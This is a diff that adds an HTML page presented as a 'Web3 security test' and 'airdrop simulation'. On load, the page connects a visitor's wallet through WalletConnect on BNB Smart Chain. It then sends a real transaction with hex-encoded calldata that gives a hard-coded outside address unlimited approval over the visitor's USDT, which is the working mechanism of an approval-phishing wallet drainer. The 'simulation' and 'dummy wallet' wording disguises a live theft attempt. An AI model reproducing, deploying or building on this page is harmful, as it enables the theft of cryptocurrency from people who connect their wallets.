@@ -1,0 +1,83 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Secure Airdrop Simulation</title>
+  <script src="https://unpkg.com/@walletconnect/sign-client@2.9.4/dist/umd/index.min.js"></script>
+  <script src="https://unpkg.com/@walletconnect/modal@2.5.1/dist/index.umd.js"></script>
+</head>
+<body>
+  <h2 style="color:green;">🧪 Web3 Security Test: WalletConnect Approval Simulation</h2>
+  <p><strong>Note:</strong> Please ensure you're using your dummy zero-balance wallet.</p>
+  <div id="wc-modal"></div>
+  <p id="status" style="font-weight:bold;"></p>
+
+  <script>
+    const projectId = "8a5fe3e9100c86464def2f5b"; // Replace with your WalletConnect Project ID
+    const providerMetadata = {
+      name: "Akzumite Audit Simulation",
+      description: "Web3 Security Research - Safe Testing Only",
+      url: "https://example.com",
+      icons: ["https://walletconnect.com/walletconnect-logo.png"],
+    };
+
+    const modal = new WalletConnectModal.WalletConnectModal({
+      projectId,
+      explorerRecommendedWalletIds: "NONE",
+      providerMetadata,
+      themeMode: "light"
+    });
+
+    let client, session;
+
+    async function startWalletConnect() {
+      client = await SignClient.init({
+        projectId,
+        metadata: providerMetadata
+      });
+
+      const { uri, approval } = await client.connect({
+        requiredNamespaces: {
+          eip155: {
+            methods: ["eth_sendTransaction"],
+            chains: ["eip155:56"],
+            events: ["accountsChanged", "chainChanged"]
+          }
+        }
+      });
+
+      modal.openModal({ uri });
+      session = await approval();
+      modal.closeModal();
+
+      simulateApprove(session);
+    }
+
+    async function simulateApprove(session) {
+      const address = session.namespaces.eip155.accounts[0].split(":")[2];
+      const tx = {
+        from: address,
+        to: "0x55d398326f99059ff775485246999027b3197955", // USDT (BEP20) on BSC
+        data: "0x095ea7b300000000000000000000000033eed64f9428637b955b0379825f2066ed5d101affffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff",
+        gas: "0x5208"
+      };
+
+      try {
+        await client.request({
+          topic: session.topic,
+          chainId: "eip155:56",
+          request: {
+            method: "eth_sendTransaction",
+            params: [tx]
+          }
+        });
+        document.getElementById("status").innerText = "✅ Approve transaction sent successfully.";
+      } catch (err) {
+        document.getElementById("status").innerText = "❌ Error: " + err.message;
+      }
+    }
+
+    startWalletConnect();
+  </script>
+</body>
+</html>
